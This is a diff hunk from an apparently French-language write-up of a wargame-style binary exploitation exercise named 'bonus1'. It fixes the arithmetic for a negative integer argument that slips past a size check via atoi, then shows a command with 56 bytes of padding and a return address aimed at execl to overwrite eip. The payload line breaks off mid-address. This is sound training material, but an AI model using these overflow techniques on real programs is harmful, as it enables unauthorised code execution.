@@ -613,7 +613,7 @@ en testant avec -INT_MAX nous obtenons ce résultat :
 pour écrire sur eip il nous faut donc un padding de :
 40 bytes (taille du buffer) + 4 bytes (retour de atoi) + 8 (gap d'allignement and esp, 0xfffffff0) + 4 bytes (pour l'addresse de ebp) = 56
 
-donc pour trouver le 1er argument il nous suffit juste de faire INT_MAX - (56 + 4(addresse de eip à overwrite) / 4) = -2147483633
+donc pour trouver le 1er argument il nous suffit juste de faire -INT_MAX + ((56 + 4(addresse de eip à overwrite)) / 4) = -2147483633
 on a plus qu'à faire ./bonus1 -2147483633 "<padding de 56> + <adresse de execl dans le programme>"
 
 ./bonus1 -2147483633 $(python -c 'print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x82\x84\x04\x
